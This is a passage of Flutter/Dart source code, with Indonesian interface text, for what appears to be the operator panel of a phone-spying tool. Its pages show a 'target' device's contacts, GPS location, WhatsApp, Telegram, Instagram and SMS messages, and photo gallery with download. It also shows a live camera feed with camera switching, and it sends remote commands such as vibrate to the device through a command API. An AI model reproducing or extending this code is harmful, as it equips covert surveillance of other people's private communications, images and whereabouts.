                  decoration: BoxDecoration(
                    color: bgSurface,
                    border: Border.all(color: mcGold, width: 2),
                  ),
                  child: const Icon(Icons.contacts_outlined, color: mcGold, size: 20),
                ),
                const SizedBox(width: 12),
                const Text(
                  "KONTAK",
                  style: TextStyle(
                    color: textMain,
                    fontSize: 13,
                    fontWeight: FontWeight.bold,
                    shadows: [
                      Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                    ],
                  ),
                ),
                const Spacer(),
                Text(
                  "${contacts.length} kontak",
                  style: const TextStyle(color: textSub, fontSize: 11),
                ),
                const SizedBox(width: 8),
                IconButton(
                  icon: const Icon(Icons.close, color: textSub),
                  onPressed: () => Navigator.pop(context),
                ),
              ],
            ),
            const SizedBox(height: 12),
            Container(height: 3, color: borderLight),
            const SizedBox(height: 16),

            Expanded(
              child: contacts.isEmpty
                  ? const Center(
                      child: Text(
                        "Tidak ada kontak ditemukan",
                        style: TextStyle(color: textSub, fontSize: 12),
                      ),
                    )
                  : ListView.builder(
                      itemCount: contacts.length,
                      itemBuilder: (context, index) {
                        final contact = contacts[index];
                        final name = contact['name'] ?? 'Tanpa Nama';
                        final number = contact['number'] ?? '';
                        final initial = name.isNotEmpty ? name[0].toUpperCase() : '?';

                        return Container(
                          margin: const EdgeInsets.only(bottom: 8),
                          padding: const EdgeInsets.all(12),
                          decoration: BoxDecoration(
                            color: bgSurface,
                            border: Border.all(color: borderLight, width: 2),
                            boxShadow: [
                              BoxShadow(
                                color: Colors.black.withOpacity(0.5),
                                blurRadius: 0,
                                offset: const Offset(2, 2),
                              )
                            ],
                          ),
                          child: Row(
                            children: [
                              Container(
                                width: 40,
                                height: 40,
                                decoration: BoxDecoration(
                                  color: bgCard,
                                  border: Border.all(color: mcGold, width: 2),
                                ),
                                child: Center(
                                  child: Text(
                                    initial,
                                    style: const TextStyle(
                                      color: mcGold,
                                      fontWeight: FontWeight.bold,
                                      fontSize: 14,
                                      shadows: [
                                        Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                                      ],
                                    ),
                                  ),
                                ),
                              ),
                              const SizedBox(width: 12),
                              Expanded(
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Text(
                                      name,
                                      style: const TextStyle(
                                        color: textMain,
                                        fontWeight: FontWeight.bold,
                                        fontSize: 12,
                                      ),
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                    if (number.isNotEmpty)
                                      Text(
                                        number,
                                        style: const TextStyle(
                                          color: textSub,
                                          fontSize: 11,
                                        ),
                                      ),
                                  ],
                                ),
                              ),
                              if (number.isNotEmpty)
                                IconButton(
                                  icon: const Icon(Icons.copy, color: textSub, size: 20),
                                  onPressed: () {
                                    Clipboard.setData(ClipboardData(text: number));
                                    ScaffoldMessenger.of(context).showSnackBar(
                                      const SnackBar(content: Text("Nomor disalin!")),
                                    );
                                  },
                                ),
                            ],
                          ),
                        );
                      },
                    ),
            ),
          ],
        ),
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════
// LOCATION FULLSCREEN PAGE - MINECRAFT
// ════════════════════════════════════════════════════════════════════════
class LocationFullscreenPage extends StatelessWidget {
  final String targetModel;
  final Map<String, dynamic> locationData;

  const LocationFullscreenPage({
    Key? key,
    required this.targetModel,
    required this.locationData,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    final double? lat = locationData['lat'];
    final double? lng = locationData['lng'];
    final String address = locationData['fullAddress'] ??
      (lat != null && lng != null ? '$lat, $lng' : 'Tidak ada data');

    return Scaffold(
      backgroundColor: bgMain,
      appBar: AppBar(
        backgroundColor: bgMain,
        elevation: 0,
        leading: IconButton(
          icon: Container(
            padding: const EdgeInsets.all(6),
            decoration: BoxDecoration(
              color: bgCard,
              border: Border.all(color: accentWhite, width: 2),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.6),
                  blurRadius: 0,
                  offset: const Offset(2, 2),
                )
              ],
            ),
            child: const Icon(Icons.arrow_back_ios_new, color: textMain, size: 16),
          ),
          onPressed: () => Navigator.pop(context),
        ),
        centerTitle: true,
        title: const Text(
          "LOCATION",
          style: TextStyle(
            color: textMain,
            fontWeight: FontWeight.bold,
            fontSize: 14,
            letterSpacing: 1.5,
            shadows: [
              Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
            ],
          ),
        ),
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(3),
          child: Container(height: 3, color: accentWhite),
        ),
      ),
      body: Stack(
        children: [
          if (lat != null && lng != null)
            Positioned.fill(
              child: _buildMapView(lat, lng),
            )
          else
            Positioned.fill(
              child: Container(
                color: bgSurface,
                child: const Center(
                  child: Text(
                    "Lokasi tidak tersedia",
                    style: TextStyle(color: textSub),
                  ),
                ),
              ),
            ),

          Positioned(
            bottom: 20,
            left: 16,
            right: 16,
            child: Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: bgCard,
                border: Border.all(color: accentWhite, width: 3),
                boxShadow: [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.8),
                    blurRadius: 0,
                    offset: const Offset(6, 6),
                  ),
                ],
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
                        decoration: BoxDecoration(
                          color: bgSurface,
                          border: Border.all(color: accentWhite, width: 2),
                        ),
                        child: const Text(
                          "BRAND",
                          style: TextStyle(
                            color: textSub,
                            fontSize: 9,
                            fontWeight: FontWeight.bold,
                            shadows: [
                              Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                            ],
                          ),
                        ),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Text(
                          targetModel,
                          style: const TextStyle(
                            color: textMain,
                            fontWeight: FontWeight.bold,
                            fontSize: 13,
                            shadows: [
                              Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                            ],
                          ),
                        ),
                      ),
                      Container(
                        width: 40,
                        height: 40,
                        decoration: BoxDecoration(
                          color: bgSurface,
                          border: Border.all(color: mcGold, width: 2),
                        ),
                        child: const Center(
                          child: Icon(Icons.location_on, color: mcGold, size: 24),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 12),

                  Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                        decoration: BoxDecoration(
                          color: bgSurface,
                          border: Border.all(color: errorColor, width: 2),
                        ),
                        child: const Text(
                          "OFFLINE",
                          style: TextStyle(
                            color: errorColor,
                            fontSize: 9,
                            fontWeight: FontWeight.bold,
                            shadows: [
                              Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                            ],
                          ),
                        ),
                      ),
                      const SizedBox(width: 8),
                      Text(
                        DateTime.now().toLocal().toString().substring(0, 16).replaceAll('-', '/'),
                        style: const TextStyle(color: textSub, fontSize: 10),
                      ),
                    ],
                  ),
                  const SizedBox(height: 16),

                  Row(
                    children: [
                      _buildInfoItem("IP Address", "-"),
                      const SizedBox(width: 8),
                      _buildInfoItem("Device ID", locationData['deviceId'] ?? "-"),
                      const SizedBox(width: 8),
                      _buildInfoItem("Brand", targetModel),
                    ],
                  ),
                  const SizedBox(height: 16),

                  Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: bgSurface,
                      border: Border.all(color: borderLight, width: 2),
                    ),
                    child: Row(
                      children: [
                        const Icon(Icons.location_on_outlined, color: textSub, size: 16),
                        const SizedBox(width: 8),
                        Expanded(
                          child: Text(
                            address,
                            style: const TextStyle(color: textMain, fontSize: 11),
                            maxLines: 2,
                            overflow: TextOverflow.ellipsis,
                          ),
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(height: 16),

                  Row(
                    children: [
                      Expanded(
                        child: ElevatedButton.icon(
                          onPressed: () async {
                            final prefs = await SharedPreferences.getInstance();
                            final token = prefs.getString('key') ?? '';

                            await http.post(
                              Uri.parse("$baseUrl/api/command/${locationData['deviceId']}"),
                              headers: {
                                "Content-Type": "application/json",
                                "x-auth-token": token,
                              },
                              body: jsonEncode({
                                "command": "vibrate",
                                "value": "5000",
                              }),
                            );

                            ScaffoldMessenger.of(context).showSnackBar(
                              const SnackBar(
                                content: Text("Menggetarkan device..."),
                                duration: Duration(seconds: 1),
                              ),
                            );
                          },
                          icon: const Icon(Icons.wb_sunny_outlined, size: 16),
                          label: const Text("Wake Up"),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: mcGold,
                            foregroundColor: Colors.black,
                            elevation: 0,
                            shape: const RoundedRectangleBorder(
                              borderRadius: BorderRadius.zero,
                              side: BorderSide(color: Colors.black, width: 2),
                            ),
                          ),
                        ),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: ElevatedButton.icon(
                          onPressed: () {},
                          icon: const Icon(Icons.delete_outline, size: 16),
                          label: const Text("Delete"),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: errorColor,
                            foregroundColor: Colors.white,
                            elevation: 0,
                            shape: const RoundedRectangleBorder(
                              borderRadius: BorderRadius.zero,
                              side: BorderSide(color: Colors.black, width: 2),
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildMapView(double lat, double lng) {
    final String mapUrl =
        "https://www.openstreetmap.org/export/embed.html?bbox=${lng-0.005},${lat-0.005},${lng+0.005},${lat+0.005}&layer=mapnik&marker=$lat,$lng";

    final controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..loadRequest(Uri.parse(mapUrl));

    return WebViewWidget(controller: controller);
  }

  Widget _buildInfoItem(String label, String value) {
    return Expanded(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            label,
            style: const TextStyle(color: textSub, fontSize: 9),
          ),
          const SizedBox(height: 4),
          Text(
            value,
            style: const TextStyle(
              color: textMain,
              fontSize: 11,
              fontWeight: FontWeight.bold,
            ),
            maxLines: 1,
            overflow: TextOverflow.ellipsis,
          ),
        ],
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════
// MESSAGE DETAIL FULLSCREEN PAGE - MINECRAFT
// ════════════════════════════════════════════════════════════════════════
class MessageDetailFullscreenPage extends StatelessWidget {
  final String appName;
  final List<dynamic> messages;
  final bool isSms;
  final String targetModel;
  final VoidCallback onBack;

  const MessageDetailFullscreenPage({
    Key? key,
    required this.appName,
    required this.messages,
    required this.isSms,
    required this.targetModel,
    required this.onBack,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgMain,
      appBar: AppBar(
        backgroundColor: bgMain,
        elevation: 0,
        leading: IconButton(
          icon: Container(
            padding: const EdgeInsets.all(6),
            decoration: BoxDecoration(
              color: bgCard,
              border: Border.all(color: accentWhite, width: 2),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.6),
                  blurRadius: 0,
                  offset: const Offset(2, 2),
                )
              ],
            ),
            child: const Icon(Icons.arrow_back_ios_new, color: textMain, size: 16),
          ),
          onPressed: onBack,
        ),
        title: Text(
          appName.toUpperCase(),
          style: const TextStyle(
            color: textMain,
            fontWeight: FontWeight.bold,
            fontSize: 13,
            letterSpacing: 1.5,
            shadows: [
              Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
            ],
          ),
        ),
        centerTitle: true,
        actions: [
          Padding(
            padding: const EdgeInsets.only(right: 16),
            child: Text(
              targetModel,
              style: const TextStyle(color: textSub, fontSize: 10),
            ),
          ),
        ],
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(3),
          child: Container(height: 3, color: accentWhite),
        ),
      ),
      body: messages.isEmpty
          ? const Center(
              child: Text(
                "Tidak ada pesan",
                style: TextStyle(color: textSub),
              ),
            )
          : ListView.builder(
              padding: const EdgeInsets.all(16),
              itemCount: messages.length,
              itemBuilder: (context, index) {
                final msg = messages[index];
                final time = msg['time'] is int
                    ? DateTime.fromMillisecondsSinceEpoch(msg['time'])
                    : DateTime.now();
                final timeStr =
                    "${time.day.toString().padLeft(2, '0')}/${time.month.toString().padLeft(2, '0')}/${time.year} ${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}";

                return Container(
                  margin: const EdgeInsets.only(bottom: 12),
                  padding: const EdgeInsets.all(14),
                  decoration: BoxDecoration(
                    color: bgCard,
                    border: Border.all(color: borderLight, width: 2),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.5),
                        blurRadius: 0,
                        offset: const Offset(3, 3),
                      )
                    ],
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
                        children: [
                          Text(
                            msg['title'] ?? '—',
                            style: TextStyle(
                              color: _getColorForApp(appName),
                              fontWeight: FontWeight.bold,
                              fontSize: 12,
                              shadows: const [
                                Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                              ],
                            ),
                          ),
                          Text(
                            timeStr,
                            style: const TextStyle(
                              color: textSub,
                              fontSize: 10,
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(height: 8),
                      Text(
                        msg['text'] ?? '—',
                        style: const TextStyle(
                          color: textMain,
                          fontSize: 12,
                        ),
                      ),
                    ],
                  ),
                );
              },
            ),
    );
  }

  Color _getColorForApp(String appName) {
    final lower = appName.toLowerCase();
    if (lower.contains('whatsapp')) return const Color(0xFF25D366);
    if (lower.contains('instagram')) return const Color(0xFFE1306C);
    if (lower.contains('telegram')) return const Color(0xFF0088CC);
    if (lower.contains('youtube')) return const Color(0xFFFF0000);
    if (lower.contains('sms')) return successColor;
    return accentWhite;
  }
}

// ════════════════════════════════════════════════════════════════════════
// GALLERY FULLSCREEN PAGE - MINECRAFT
// ════════════════════════════════════════════════════════════════════════
class GalleryFullscreenPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final Stream<List<Map<String, dynamic>>> galleryStream;
  final VoidCallback onClose;
  final VoidCallback onRefresh;
  final Function(String) onDownload;

  const GalleryFullscreenPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.galleryStream,
    required this.onClose,
    required this.onRefresh,
    required this.onDownload,
  }) : super(key: key);

  @override
  State<GalleryFullscreenPage> createState() => _GalleryFullscreenPageState();
}

class _GalleryFullscreenPageState extends State<GalleryFullscreenPage> {
  List<Map<String, dynamic>> _photos = [];
  bool _isLoading = true;
  String _currentImage = '';
  int _currentIndex = 0;
  bool _showImageViewer = false;
  double _scale = 1.0;
  double _offsetX = 0.0;
  double _offsetY = 0.0;

  @override
  void initState() {
    super.initState();
    widget.galleryStream.listen((photos) {
      if (mounted) {
        setState(() {
          _photos = photos;
          _isLoading = false;
        });
      }
    });
  }

  void _openImageViewer(int index) {
    if (_photos.isEmpty || index >= _photos.length) return;
    setState(() {
      _currentIndex = index;
      _currentImage = _photos[index]['thumb'] ?? '';
      _showImageViewer = true;
      _scale = 1.0;
      _offsetX = 0.0;
      _offsetY = 0.0;
    });
  }

  void _closeImageViewer() {
    setState(() {
      _showImageViewer = false;
      _currentImage = '';
      _scale = 1.0;
      _offsetX = 0.0;
      _offsetY = 0.0;
    });
  }

  void _nextImage() {
    if (_currentIndex < _photos.length - 1) {
      setState(() {
        _currentIndex++;
        _currentImage = _photos[_currentIndex]['thumb'] ?? '';
        _scale = 1.0;
        _offsetX = 0.0;
        _offsetY = 0.0;
      });
    }
  }

  void _prevImage() {
    if (_currentIndex > 0) {
      setState(() {
        _currentIndex--;
        _currentImage = _photos[_currentIndex]['thumb'] ?? '';
        _scale = 1.0;
        _offsetX = 0.0;
        _offsetY = 0.0;
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Stack(
          children: [
            if (_isLoading)
              const Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    SizedBox(
                      width: 50,
                      height: 50,
                      child: CircularProgressIndicator(color: accentWhite, strokeWidth: 3),
                    ),
                    SizedBox(height: 20),
                    Text(
                      "LOADING GALLERY...",
                      style: TextStyle(
                        color: textSub,
                        fontSize: 12,
                        letterSpacing: 3,
                        shadows: [
                          Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                        ],
                      ),
                    ),
                  ],
                ),
              )
            else if (_photos.isEmpty)
              const Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(Icons.photo_library_outlined, color: Colors.white24, size: 64),
                    SizedBox(height: 16),
                    Text(
                      "Tidak ada foto",
                      style: TextStyle(
                        color: Colors.white38,
                        fontSize: 13,
                        letterSpacing: 1,
                        shadows: [
                          Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                        ],
                      ),
                    ),
                  ],
                ),
              )
            else
              GridView.builder(
                padding: const EdgeInsets.all(8),
                gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                  crossAxisCount: 3,
                  crossAxisSpacing: 6,
                  mainAxisSpacing: 6,
                  childAspectRatio: 1,
                ),
                itemCount: _photos.length > 40 ? 40 : _photos.length,
                itemBuilder: (context, index) {
                  final photo = _photos[index];
                  final thumb = photo['thumb'] ?? '';
                  return GestureDetector(
                    onTap: () => _openImageViewer(index),
                    child: Container(
                      decoration: BoxDecoration(
                        color: bgCard,
                        border: Border.all(color: accentWhite, width: 2),
                        boxShadow: [
                          BoxShadow(
                            color: Colors.black.withOpacity(0.6),
                            blurRadius: 0,
                            offset: const Offset(2, 2),
                          )
                        ],
                      ),
                      child: thumb.isNotEmpty
                          ? Image.memory(
                              base64Decode(thumb.contains(',') ? thumb.split(',').last : thumb),
                              fit: BoxFit.cover,
                              errorBuilder: (context, error, stackTrace) {
                                return Container(
                                  color: bgSurface,
                                  child: const Icon(Icons.broken_image, color: Colors.white24, size: 30),
                                );
                              },
                            )
                          : Container(
                              color: bgSurface,
                              child: const Icon(Icons.image_not_supported, color: Colors.white24, size: 30),
                            ),
                    ),
                  );
                },
              ),

            Positioned(
              top: 0, left: 0, right: 0,
              child: Container(
                padding: const EdgeInsets.fromLTRB(20, 20, 20, 12),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [Colors.black.withOpacity(0.85), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        Container(
                          width: 10,
                          height: 10,
                          decoration: const BoxDecoration(color: accentWhite),
                        ),
                        const SizedBox(width: 10),
                        const Text(
                          "GALLERY",
                          style: TextStyle(
                            color: Colors.white,
                            fontSize: 13,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 2,
                            shadows: [
                              Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                            ],
                          ),
                        ),
                        const SizedBox(width: 12),
                        Text(
                          "${_photos.length > 40 ? '40' : _photos.length} / ${_photos.length}",
                          style: TextStyle(
                            color: Colors.white.withOpacity(0.4),
                            fontSize: 10,
                            letterSpacing: 1,
                          ),
                        ),
                      ],
                    ),
                    Text(
                      widget.targetModel,
                      style: TextStyle(
                        color: Colors.white.withOpacity(0.4),
                        fontSize: 10,
                        letterSpacing: 1,
                      ),
                    ),
                  ],
                ),
              ),
            ),

            Positioned(
              top: 20, right: 20,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 40, height: 40,
                  decoration: BoxDecoration(
                    color: bgCard,
                    border: Border.all(color: accentWhite, width: 2),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.6),
                        blurRadius: 0,
                        offset: const Offset(2, 2),
                      )
                    ],
                  ),
                  child: const Icon(Icons.close, color: textMain, size: 20),
                ),
              ),
            ),

            Positioned(
              top: 20, left: 120,
              child: GestureDetector(
                onTap: () {
                  setState(() => _isLoading = true);
                  widget.onRefresh();
                  Future.delayed(const Duration(seconds: 3), () {
                    if (mounted) setState(() => _isLoading = false);
                  });
                },
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                  decoration: BoxDecoration(
                    color: bgCard,
                    border: Border.all(color: accentWhite, width: 2),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.6),
                        blurRadius: 0,
                        offset: const Offset(2, 2),
                      )
                    ],
                  ),
                  child: const Row(
                    children: [
                      Icon(Icons.refresh, color: textMain, size: 16),
                      SizedBox(width: 4),
                      Text(
                        "REFRESH",
                        style: TextStyle(
                          color: textMain,
                          fontSize: 10,
                          letterSpacing: 1,
                          shadows: [
                            Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ),

            if (_showImageViewer && _currentImage.isNotEmpty)
              Container(
                color: Colors.black.withOpacity(0.95),
                child: Stack(
                  children: [
                    Center(
                      child: GestureDetector(
                        onScaleStart: (details) {
                          setState(() { _offsetX = 0; _offsetY = 0; _scale = 1.0; });
                        },
                        onScaleUpdate: (details) {
                          setState(() {
                            _scale = (_scale * details.scale).clamp(0.5, 4.0);
                            _offsetX += details.focalPointDelta.dx;
                            _offsetY += details.focalPointDelta.dy;
                          });
                        },
                        child: Transform(
                          transform: Matrix4.identity()..translate(_offsetX, _offsetY)..scale(_scale),
                          child: Image.memory(
                            base64Decode(_currentImage.contains(',') ? _currentImage.split(',').last : _currentImage),
                            fit: BoxFit.contain,
                            width: MediaQuery.of(context).size.width * 0.95,
                            height: MediaQuery.of(context).size.height * 0.75,
                            errorBuilder: (context, error, stackTrace) {
                              return const Center(
                                child: Text("Error loading image", style: TextStyle(color: Colors.white38)),
                              );
                            },
                          ),
                        ),
                      ),
                    ),
                    Positioned(
                      top: 20, right: 20,
                      child: GestureDetector(
                        onTap: _closeImageViewer,
                        child: Container(
                          width: 40, height: 40,
                          decoration: BoxDecoration(
                            color: bgCard,
                            border: Border.all(color: accentWhite, width: 2),
                            boxShadow: [
                              BoxShadow(
                                color: Colors.black.withOpacity(0.6),
                                blurRadius: 0,
                                offset: const Offset(2, 2),
                              )
                            ],
                          ),
                          child: const Icon(Icons.close, color: textMain, size: 20),
                        ),
                      ),
                    ),
                    if (_photos.length > 1) ...[
                      Positioned(
                        left: 10, top: 0, bottom: 0,
                        child: Center(
                          child: GestureDetector(
                            onTap: _prevImage,
                            child: Container(
                              padding: const EdgeInsets.all(8),
                              decoration: BoxDecoration(
                                color: bgCard,
                                border: Border.all(color: accentWhite, width: 2),
                                boxShadow: [
                                  BoxShadow(
                                    color: Colors.black.withOpacity(0.6),
                                    blurRadius: 0,
                                    offset: const Offset(2, 2),
                                  )
                                ],
                              ),
                              child: const Icon(Icons.chevron_left, color: textMain, size: 30),
                            ),
                          ),
                        ),
                      ),
                      Positioned(
                        right: 10, top: 0, bottom: 0,
                        child: Center(
                          child: GestureDetector(
                            onTap: _nextImage,
                            child: Container(
                              padding: const EdgeInsets.all(8),
                              decoration: BoxDecoration(
                                color: bgCard,
                                border: Border.all(color: accentWhite, width: 2),
                                boxShadow: [
                                  BoxShadow(
                                    color: Colors.black.withOpacity(0.6),
                                    blurRadius: 0,
                                    offset: const Offset(2, 2),
                                  )
                                ],
                              ),
                              child: const Icon(Icons.chevron_right, color: textMain, size: 30),
                            ),
                          ),
                        ),
                      ),
                    ],
                    Positioned(
                      bottom: 80, left: 0, right: 0,
                      child: Center(
                        child: Container(
                          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
                          decoration: BoxDecoration(
                            color: bgCard,
                            border: Border.all(color: accentWhite, width: 2),
                            boxShadow: [
                              BoxShadow(
                                color: Colors.black.withOpacity(0.6),
                                blurRadius: 0,
                                offset: const Offset(2, 2),
                              )
                            ],
                          ),
                          child: Text(
                            "${_currentIndex + 1} / ${_photos.length > 40 ? 40 : _photos.length}",
                            style: const TextStyle(
                              color: textMain,
                              fontSize: 11,
                              letterSpacing: 1,
                              shadows: [
                                Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                              ],
                            ),
                          ),
                        ),
                      ),
                    ),
                    Positioned(
                      bottom: 20, left: 0, right: 0,
                      child: Center(
                        child: ElevatedButton.icon(
                          onPressed: () {
                            widget.onDownload(_currentImage);
                            ScaffoldMessenger.of(context).showSnackBar(
                              const SnackBar(
                                content: Text("Downloading..."),
                                duration: Duration(seconds: 1),
                              ),
                            );
                          },
                          icon: const Icon(Icons.download, size: 18),
                          label: const Text("DOWNLOAD"),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: accentWhite,
                            foregroundColor: Colors.white,
                            padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                            shape: const RoundedRectangleBorder(
                              borderRadius: BorderRadius.zero,
                              side: BorderSide(color: Colors.black, width: 2),
                            ),
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
          ],
        ),
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════
// LIVE CAMERA PAGE - MINECRAFT
// ════════════════════════════════════════════════════════════════════════
class LiveCameraPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final String facing;
  final VoidCallback onClose;
  final Stream<String> frameStream;
  final bool isLoading;
  final Function(String) onSwitchCamera;
  final VoidCallback onCapture;

  const LiveCameraPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.facing,
    required this.onClose,
    required this.frameStream,
    required this.isLoading,
    required this.onSwitchCamera,
    required this.onCapture,
  }) : super(key: key);

  @override
  State<LiveCameraPage> createState() => _LiveCameraPageState();
}

class _LiveCameraPageState extends State<LiveCameraPage> {
  String _currentFrame = '';
  bool _isLoading = true;

  @override
  void initState() {
    super.initState();
    _isLoading = widget.isLoading;
    widget.frameStream.listen((frame) {
      if (mounted) {
        setState(() {
          _currentFrame = frame;
          _isLoading = false;
        });
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Stack(
          children: [
            if (_currentFrame.isNotEmpty)
              Center(
                child: RepaintBoundary(
                  child: InteractiveViewer(
                    minScale: 0.5, maxScale: 3.0,
                    child: Image.memory(
                      base64Decode(_currentFrame.split(',').last),
                      fit: BoxFit.contain,
                      width: double.infinity,
                      height: double.infinity,
                      errorBuilder: (context, error, stackTrace) {
                        return const Center(
                          child: Text("Error loading camera", style: TextStyle(color: Colors.white54)),
                        );
                      },
                    ),
                  ),
                ),
              )
            else
              const Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    SizedBox(
                      width: 50,
                      height: 50,
                      child: CircularProgressIndicator(color: accentWhite, strokeWidth: 3),
                    ),
                    SizedBox(height: 20),
                    Text(
                      "CONNECTING CAMERA...",
                      style: TextStyle(
                        color: textSub,
                        fontSize: 12,
                        letterSpacing: 3,
                        shadows: [
                          Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                        ],
                      ),
                    ),
                  ],
                ),
              ),

            Positioned(
              top: 0, left: 0, right: 0,
              child: Container(
                padding: const EdgeInsets.fromLTRB(20, 20, 20, 20),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter, end: Alignment.bottomCenter,
                    colors: [Colors.black.withOpacity(0.85), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        Container(
                          width: 10,
                          height: 10,
                          decoration: const BoxDecoration(color: accentWhite),
                        ),
                        const SizedBox(width: 10),
                        const Text(
                          "LIVE",
                          style: TextStyle(
                            color: Colors.white,
                            fontSize: 13,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 2,
                            shadows: [
                              Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                            ],
                          ),
                        ),
                        const SizedBox(width: 16),
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                          decoration: BoxDecoration(
                            color: bgCard,
                            border: Border.all(color: accentWhite, width: 2),
                          ),
                          child: Text(
                            widget.facing.toUpperCase(),
                            style: const TextStyle(
                              color: textMain,
                              fontSize: 9,
                              letterSpacing: 1,
                              shadows: [
                                Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                              ],
                            ),
                          ),
                        ),
                      ],
                    ),
                    Text(
                      widget.targetModel,
                      style: TextStyle(
                        color: Colors.white.withOpacity(0.4),
                        fontSize: 10,
                        letterSpacing: 1,
                      ),
                    ),
                  ],
                ),
              ),
            ),

            Positioned(
              top: 20, right: 20,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 40, height: 40,
                  decoration: BoxDecoration(
                    color: bgCard,
                    border: Border.all(color: accentWhite, width: 2),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.6),
                        blurRadius: 0,
                        offset: const Offset(2, 2),
                      )
                    ],
                  ),
                  child: const Icon(Icons.close, color: textMain, size: 20),
                ),
              ),
            ),

            Positioned(
              bottom: 55, left: 30,
              child: GestureDetector(
                onTap: () {
                  final newFacing = widget.facing == 'front' ? 'back' : 'front';
                  widget.onSwitchCamera(newFacing);
                },
                child: Container(
                  width: 44, height: 44,
                  decoration: BoxDecoration(
                    color: bgCard,
                    border: Border.all(color: accentWhite, width: 2),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.6),
                        blurRadius: 0,
                        offset: const Offset(2, 2),
                      )
                    ],
                  ),
                  child: const Icon(Icons.switch_camera, color: textMain, size: 22),
                ),
              ),
            ),

            Positioned(
              bottom: 55, right: 30,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
